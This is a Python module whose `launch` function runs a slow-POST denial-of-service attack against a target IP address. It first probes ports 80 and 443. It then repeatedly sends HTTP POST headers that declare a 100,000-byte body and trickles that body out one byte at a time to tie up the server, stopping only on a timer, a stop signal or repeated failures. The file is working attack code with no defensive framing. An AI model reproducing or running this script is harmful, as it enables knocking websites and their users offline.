import socket
import ssl
import time

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker):
    start_time = time.time()
    sent = 0  # Total packets/bytes sent

    # Prioritize ports: try 80 first, then 443
    prioritized_ports = [80, 443]

    # We'll track if ports are active
    active_port = None

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        # If no active port selected or active port inactive, try to find active port
        if active_port is None:
            port_active_found = False
            for port in prioritized_ports:
                if port not in port_list:
                    continue

                for proto in ["http", "https"] if port == 443 else ["http"]:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)

                        if proto == "https":
                            context = ssl.create_default_context()
                            s = context.wrap_socket(s, server_hostname=target_ip)

                        s.connect((target_ip, port))
                        s.close()
                        # If connect succeeds, port is active
                        active_port = port
                        port_active_found = True
                        break  # Exit proto loop
                    except Exception:
                        continue

                if port_active_found:
                    break  # Exit port loop

            if not port_active_found:
                # Neither port 80 nor 443 is active — stop attack
                stop_event.set()
                print(f"[x] {tag} stopped: Neither port 80 nor 443 is active.")
                return

        # Now attack using active_port only
        port = active_port
        for proto in ["https", "http"] if port == 443 else ["http"]:
            failed = 0  # Reset failure count per port/protocol attempt

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)

                if proto == "https":
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=target_ip)

                s.connect((target_ip, port))

                s.sendall(b"POST / HTTP/1.1\r\n")
                s.sendall(b"Host: %b\r\n" % target_ip.encode())
                s.sendall(b"Content-Length: %d\r\n" % 100000)
                s.sendall(b"Content-Type: application/x-www-form-urlencoded\r\n")
                s.sendall(b"\r\n")

                sent += 1  # Count initial headers

                body = "A" * 100000
                for c in body:
                    if stop_event.is_set():
                        break
                    try:
                        s.send(c.encode())
                        sent += 1
                    except Exception:
                        failed += 1
                        if failed > 20:
                            fail_tracker.append(f"{tag}-{port}-{proto}")
                            stop_event.set()
                            print(f"[x] {tag} on port {port} ({proto}) stopped due to send failures.")
                            s.close()
                            return
                        break

                try:
                    s.settimeout(1)
                    data = s.recv(1024)
                    if not data:
                        failed += 21
                        if failed > 20:
                            fail_tracker.append(f"{tag}-{port}-{proto}")
                            stop_event.set()
                            print(f"[x] {tag} on port {port} ({proto}) stopped due to server closing connection.")
                            s.close()
                            return
                except Exception:
                    pass

                s.close()
                # If successful, continue attacking on active_port
                break

            except Exception:
                failed += 1
                if failed > 20:
                    fail_tracker.append(f"{tag}-{port}-{proto}")
                    stop_event.set()
                    print(f"[x] {tag} on port {port} ({proto}) stopped due to connection failures.")
                    return
                # If failure, mark port inactive and try to find active port again
                active_port = None
                break

    print(f"[i] {tag} finished: Sent {sent} packets/bytes")
